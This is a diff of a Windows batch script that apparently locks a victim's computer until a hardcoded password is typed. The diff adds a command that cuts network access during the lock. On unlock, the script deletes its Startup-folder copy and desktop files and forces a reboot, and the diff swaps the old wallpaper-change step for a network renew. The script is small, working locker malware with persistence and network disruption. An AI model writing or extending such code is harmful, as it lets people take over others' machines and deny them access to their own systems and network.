@@ -33,7 +33,7 @@
 ::978f952a14a936cc963da21a135fa983
 @echo off
 color 14
-
+ipconfig /release * 
 set password=2314
 set count=1
 set limit=5
@@ -57,17 +57,14 @@ if %Input% equ %password% (
         cd..
         tree
         echo Computer unlocked.
-        reg add "hkcu\control panel\desktop" /v wallpaper /t REG_SZ /d "C:\Users\peakfila\Desktop\hejewan.jpg" /f 
-        reg add "hkcu\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 0 /f
-        RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters ,1 ,True
         @echo off
 
         del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\BRVYM.bat"
         del "C:\Users\%username%\Desktop\gang.bat"
         del "C:\Users\%username%\Desktop\happyking.jpg"
-        del "C:\Users\%username%\Desktop\hejewan.jpg"
         del "C:\Users\%username%\Desktop\happyman.bat"
-        shutdown -r -t 5 -c "Unlocking the computer has worked successfully. Please change the wallpaper in Personal Settings."
+        ipconfig /renew
+        shutdown -r -t 5 -c "Unlocked!"
 
 	goto End
 ) else (
